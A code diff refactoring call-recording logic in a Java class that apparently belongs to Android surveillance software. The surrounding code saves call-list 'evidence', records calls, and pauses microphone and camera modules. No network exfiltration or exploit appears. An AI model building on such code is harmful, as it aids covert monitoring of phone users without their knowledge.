@@ -127,13 +127,7 @@ public class BroadcastMonitorCall  {
 
 								ModuleCall.self().saveCalllistEvidence(ModuleCall.CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.getDuration());
 							}else {
-								RecordCall.self().stopCall();
-								if (ModuleCamera.self() != null) {
-									ModuleCamera.self().removeStop(MODULE_STOP_REASON);
-								}
-								if (ModuleMic.self() != null) {
-									ModuleMic.self().removeStop(MODULE_STOP_REASON);
-								}
+								stopRecordCall();
 							}
 							ongoing_number="";
 						}
@@ -158,13 +152,7 @@ public class BroadcastMonitorCall  {
 								if (Cfg.DEBUG) {
 									Check.log(TAG + " (c): starting call"); //$NON-NLS-1$
 								}
-								if(ModuleMic.self()!=null) {
-									ModuleMic.self().addStop(MODULE_STOP_REASON);
-								}
-								if(ModuleCamera.self()!=null) {
-									ModuleCamera.self().addStop(MODULE_STOP_REASON);
-								}
-								RecordCall.self().recordCall(call);
+								startRecordCall();
 
 							}
 						}
@@ -189,6 +177,29 @@ public class BroadcastMonitorCall  {
 				Check.log(TAG + " (manageReceive) Error: " + ex);
 				ex.printStackTrace();
 			}
+		}
+	}
+
+	public static void startRecordCall() {
+
+		if(ModuleMic.self()!=null) {
+			ModuleMic.self().addStop(MODULE_STOP_REASON);
+		}
+		if(ModuleCamera.self()!=null) {
+			ModuleCamera.self().addStop(MODULE_STOP_REASON);
+		}
+		if(call.isOngoing()) {
+			RecordCall.self().recordCall(call);
+		}
+	}
+
+	public static void stopRecordCall() {
+		RecordCall.self().stopCall();
+		if (ModuleCamera.self() != null) {
+			ModuleCamera.self().removeStop(MODULE_STOP_REASON);
+		}
+		if (ModuleMic.self() != null) {
+			ModuleMic.self().removeStop(MODULE_STOP_REASON);
 		}
 	}
 
